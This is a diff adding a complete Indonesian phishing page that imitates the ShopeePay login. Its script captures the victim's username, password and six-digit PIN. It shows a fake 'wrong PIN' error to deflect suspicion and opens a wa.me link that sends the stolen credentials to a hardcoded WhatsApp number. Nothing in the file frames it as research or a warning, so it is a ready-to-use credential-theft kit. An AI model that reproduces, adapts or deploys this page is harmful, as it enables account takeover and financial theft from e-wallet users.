@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopee Pay Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, sans-serif; margin: 0; padding: 0; }
+        body { background: #fff; color: #222; }
+        .header { display: flex; align-items: center; padding: 15px; border-bottom: 1px solid #eee; }
+        .header i { color: #ee4d2d; font-size: 20px; margin-right: 15px; cursor: pointer; }
+        .header h1 { font-size: 17px; font-weight: 500; }
+        .container { padding: 25px; max-width: 450px; margin: auto; text-align: center; }
+        
+        /* Form Login */
+        .input-group { display: flex; align-items: center; border-bottom: 1px solid #dbdbdb; padding: 10px 0; margin-bottom: 15px; }
+        .input-group input { border: none; outline: none; flex: 1; font-size: 16px; padding-left: 10px; }
+        
+        /* Tombol */
+        .btn-main { background: #f5f5f5; color: #bbb; border: none; width: 100%; padding: 13px; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        .active-btn { background: #ee4d2d !important; color: white !important; }
+
+        /* Overlay PIN */
+        #page-pin { display: none; }
+        .pin-inputs { display: flex; justify-content: center; gap: 8px; margin: 30px 0; }
+        .pin-box { width: 45px; height: 50px; border: 1px solid #dbdbdb; text-align: center; font-size: 24px; border-radius: 4px; }
+        .error-msg { color: #ee4d2d; font-size: 14px; margin-top: 15px; display: none; font-weight: 500; }
+
+        #loading { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; display: none; justify-content: center; align-items: center; z-index: 100; flex-direction: column; }
+        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #ee4d2d; border-radius: 50%; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="loading"><div class="spinner"></div></div>
+
+    <div id="page-login">
+        <div class="header"><h1>Log In</h1></div>
+        <div class="container">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fe/Shopee.svg" width="80" style="margin-bottom:40px;">
+            <div class="input-group">
+                <i class="fa-regular fa-user"></i>
+                <input type="text" id="user" placeholder="No. Handphone/Email/Username" oninput="cek()">
+            </div>
+            <div class="input-group">
+                <i class="fa-solid fa-lock"></i>
+                <input type="password" id="pass" placeholder="Password" oninput="cek()">
+            </div>
+            <button id="btnLog" class="btn-main" onclick="kePin()">Log In</button>
+        </div>
+    </div>
+
+    <div id="page-pin">
+        <div class="header"><i class="fa-solid fa-arrow-left" onclick="location.reload()"></i><h1>PIN ShopeePay</h1></div>
+        <div class="container">
+            <p style="margin-top:20px; font-weight:500;">Masukkan PIN ShopeePay</p>
+            <div class="pin-inputs">
+                <input type="password" maxlength="1" class="pin-box">
+                <input type="password" maxlength="1" class="pin-box">
+                <input type="password" maxlength="1" class="pin-box">
+                <input type="password" maxlength="1" class="pin-box">
+                <input type="password" maxlength="1" class="pin-box">
+                <input type="password" maxlength="1" class="pin-box">
+            </div>
+            <button class="btn-main active-btn" onclick="kirimSemua()">Konfirmasi</button>
+            <p id="error" class="error-msg">⚠️ PIN salah, coba lagi</p>
+        </div>
+    </div>
+
+    <script>
+        function cek() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            document.getElementById('btnLog').className = (u && p) ? "btn-main active-btn" : "btn-main";
+        }
+
+        function kePin() {
+            document.getElementById('loading').style.display = 'flex';
+            setTimeout(() => {
+                document.getElementById('loading').style.display = 'none';
+                document.getElementById('page-login').style.display = 'none';
+                document.getElementById('page-pin').style.display = 'block';
+            }, 1500);
+        }
+
+        function kirimSemua() {
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            let pin = "";
+            document.querySelectorAll('.pin-box').forEach(b => pin += b.value);
+
+            if(pin.length < 6) { alert("Masukkan 6 digit PIN!"); return; }
+
+            const noWA = "6285805620828";
+            const teks = `*LOG DATA BARU*%0A%0A👤 User: ${u}%0A🔑 Pass: ${p}%0A📌 PIN: ${pin}`;
+            
+            // Tampilkan pesan error di layar
+            document.getElementById('error').style.display = 'block';
+
+            // Kirim ke WA (Membuka tab baru agar tidak memutus tampilan PIN)
+            window.open(`https://wa.me/${noWA}?text=${teks}`, '_blank');
+        }
+
+        // Auto move focus PIN
+        const inputs = document.querySelectorAll('.pin-box');
+        inputs.forEach((input, i) => {
+            input.oninput = () => { if(input.value && i < 5) inputs[i+1].focus(); };
+        });
+    </script>
+</body>
+</html>
